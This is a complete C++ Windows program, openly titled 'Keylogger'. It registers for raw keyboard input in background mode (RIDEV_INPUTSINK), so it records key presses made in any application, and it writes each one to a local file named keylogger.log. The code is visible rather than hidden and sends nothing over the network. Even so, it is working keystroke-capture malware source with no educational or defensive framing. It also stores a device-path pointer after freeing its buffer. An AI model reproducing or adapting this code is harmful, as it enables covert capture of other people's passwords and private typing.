#ifndef UNICODE
#define UNICODE
#endif

#include <windows.h>
#include <initguid.h>
#include <devguid.h>
#include <setupapi.h>
#include <vector>
#include <fstream>
#include <unordered_map>

#pragma comment(lib, "setupapi.lib")

DEFINE_GUID(GUID_DEVINTERFACE_KEYBOARD,
    0x884b96c3, 0x56ef, 0x11d1,
    0xbc, 0x8c, 0x00, 0xa0, 0xc9, 0x14, 0x05, 0xdd);

std::wofstream logFile("keylogger.log", std::ios::app);
std::vector<PWSTR> keyboardDevicePaths;

std::unordered_map<DWORD, std::wstring> vkeyToWString = {
    {0x01, L"Left Mouse Button"},
    {0x02, L"Right Mouse Button"},
    {0x03, L"Control-break processing"},
    {0x04, L"Middle Mouse Button"},
    {0x05, L"X1 Mouse Button"},
    {0x06, L"X2 Mouse Button"},
    {0x08, L"Backspace"},
    {0x09, L"Tab"},
    {0x0C, L"Clear"},
    {0x0D, L"Enter"},
    {0x10, L"Shift"},
    {0x11, L"Ctrl"},
    {0x12, L"Alt"},
    {0x13, L"Pause"},
    {0x14, L"Caps Lock"},
    {0x1B, L"Escape"},
    {0x20, L"Space"},
    {0x21, L"Page Up"},
    {0x22, L"Page Down"},
    {0x23, L"End"},
    {0x24, L"Home"},
    {0x25, L"Left Arrow"},
    {0x26, L"Up Arrow"},
    {0x27, L"Right Arrow"},
    {0x28, L"Down Arrow"},
    {0x2C, L"Print Screen"},
    {0x2D, L"Insert"},
    {0x2E, L"Delete"},
    {0x30, L"0"}, {0x31, L"1"}, {0x32, L"2"}, {0x33, L"3"}, {0x34, L"4"},
    {0x35, L"5"}, {0x36, L"6"}, {0x37, L"7"}, {0x38, L"8"}, {0x39, L"9"},
    {0x41, L"A"}, {0x42, L"B"}, {0x43, L"C"}, {0x44, L"D"}, {0x45, L"E"},
    {0x46, L"F"}, {0x47, L"G"}, {0x48, L"H"}, {0x49, L"I"}, {0x4A, L"J"},
    {0x4B, L"K"}, {0x4C, L"L"}, {0x4D, L"M"}, {0x4E, L"N"}, {0x4F, L"O"},
    {0x50, L"P"}, {0x51, L"Q"}, {0x52, L"R"}, {0x53, L"S"}, {0x54, L"T"},
    {0x55, L"U"}, {0x56, L"V"}, {0x57, L"W"}, {0x58, L"X"}, {0x59, L"Y"}, {0x5A, L"Z"},
    {0x5B, L"Left Windows"}, {0x5C, L"Right Windows"}, {0x5D, L"Applications"},
    {0x5F, L"Sleep"},
    {0x60, L"Numpad 0"}, {0x61, L"Numpad 1"}, {0x62, L"Numpad 2"}, {0x63, L"Numpad 3"},
    {0x64, L"Numpad 4"}, {0x65, L"Numpad 5"}, {0x66, L"Numpad 6"}, {0x67, L"Numpad 7"},
    {0x68, L"Numpad 8"}, {0x69, L"Numpad 9"}, {0x6A, L"Multiply"}, {0x6B, L"Add"},
    {0x6C, L"Separator"}, {0x6D, L"Subtract"}, {0x6E, L"Decimal"}, {0x6F, L"Divide"},
    {0x70, L"F1"}, {0x71, L"F2"}, {0x72, L"F3"}, {0x73, L"F4"}, {0x74, L"F5"},
    {0x75, L"F6"}, {0x76, L"F7"}, {0x77, L"F8"}, {0x78, L"F9"}, {0x79, L"F10"},
    {0x7A, L"F11"}, {0x7B, L"F12"}, {0x7C, L"F13"}, {0x7D, L"F14"}, {0x7E, L"F15"},
    {0x7F, L"F16"}, {0x80, L"F17"}, {0x81, L"F18"}, {0x82, L"F19"}, {0x83, L"F20"},
    {0x84, L"F21"}, {0x85, L"F22"}, {0x86, L"F23"}, {0x87, L"F24"},
    {0x90, L"Num Lock"}, {0x91, L"Scroll Lock"},
    {0xA0, L"Left Shift"}, {0xA1, L"Right Shift"}, {0xA2, L"Left Ctrl"},
    {0xA3, L"Right Ctrl"}, {0xA4, L"Left Alt"}, {0xA5, L"Right Alt"}
};

void LogMessage(const std::wstring& message) {
    // flush to make sure message is written immediately
    logFile << message << std::endl;
    logFile.flush();
}

void ListKeyboardDevicePaths() {
    std::vector<PWSTR> keyboardPaths;
    HDEVINFO deviceInfo = SetupDiGetClassDevs(&GUID_DEVINTERFACE_KEYBOARD, NULL, NULL, DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);
    if (deviceInfo == INVALID_HANDLE_VALUE) { return;  }
    SP_DEVICE_INTERFACE_DATA devInterfaceData = {};
    devInterfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);
    for (DWORD i = 0; SetupDiEnumDeviceInterfaces(deviceInfo, NULL, &GUID_DEVINTERFACE_KEYBOARD, i, &devInterfaceData); i++) {
        DWORD requiredSize = 0;
        SetupDiGetDeviceInterfaceDetail(deviceInfo, &devInterfaceData, NULL, 0, &requiredSize, NULL);
        PSP_DEVICE_INTERFACE_DETAIL_DATA devDetail = (PSP_DEVICE_INTERFACE_DETAIL_DATA)malloc(requiredSize);
        if (!devDetail) { continue; } 
        devDetail->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA);
        if (SetupDiGetDeviceInterfaceDetail(deviceInfo, &devInterfaceData, devDetail, requiredSize, NULL, NULL)) {
            keyboardDevicePaths.push_back(devDetail->DevicePath);
            LogMessage(L"Found keyboard device: " + std::wstring(devDetail->DevicePath));
        }
        free(devDetail);
    }
    SetupDiDestroyDeviceInfoList(deviceInfo);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            // write initial program message
            TextOut(hdc, 10, 10, L"Keylogger", 9);
            EndPaint(hwnd, &ps);
            return 0;
        }
        case WM_INPUT: {
            UINT dwSize = 0;
            GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER));
            LPBYTE lpb = new BYTE[dwSize];
            if (!lpb) { return 0; }
            if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb, &dwSize, sizeof(RAWINPUTHEADER)) == dwSize) {
                RAWINPUT* raw = (RAWINPUT*)lpb;
                if (raw->header.dwType == RIM_TYPEKEYBOARD) {
                    if (!(raw->data.keyboard.Flags & RI_KEY_BREAK) && raw->data.keyboard.Message == WM_KEYDOWN) {
                        LogMessage(L"Key Pressed: " + vkeyToWString[raw->data.keyboard.VKey] + L" " + std::to_wstring(raw->data.keyboard.VKey));
                    }
                }
            }
            delete[] lpb;
            return 0;
        }
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    LogMessage(L"Starting program");
    // get keyboard device paths
    LogMessage(L"Listing keyboard device paths");
    ListKeyboardDevicePaths();
    // register window class
    LogMessage(L"Registering window class");
    const wchar_t CLASS_NAME[] = L"KeyloggerClass";
    WNDCLASS wc = { };
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    if (!RegisterClass(&wc)) {
        MessageBox(NULL, L"Window class registration failed!", L"Error", MB_OK);
        return 1;
    }
    // create window
    LogMessage(L"Creating window");
    HWND hwnd = CreateWindowEx(
        0, CLASS_NAME, L"Keylogger", WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 300, 200,
        NULL, NULL, hInstance, NULL
    );
    if (hwnd == NULL) {
        MessageBox(NULL, L"Window creation failed!", L"Error", MB_OK);
        return 1;
    }
    ShowWindow(hwnd, nCmdShow);
    // register raw input from keyboards
    LogMessage(L"Registering raw input");
    RAWINPUTDEVICE rid[1];
    rid[0].usUsagePage = 0x01; // generic desktop controls
    rid[0].usUsage = 0x06; // keyboard
    rid[0].dwFlags = RIDEV_INPUTSINK | RIDEV_DEVNOTIFY; // receive input even when not in foreground
    rid[0].hwndTarget = hwnd;
    if (!RegisterRawInputDevices(rid, 1, sizeof(rid[0]))) {
        MessageBox(NULL, L"Failed to register raw input devices!", L"Error", MB_OK);
        return 1;
    }
    // message loop
    LogMessage(L"Entering message loop");
    MSG msg = { };
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
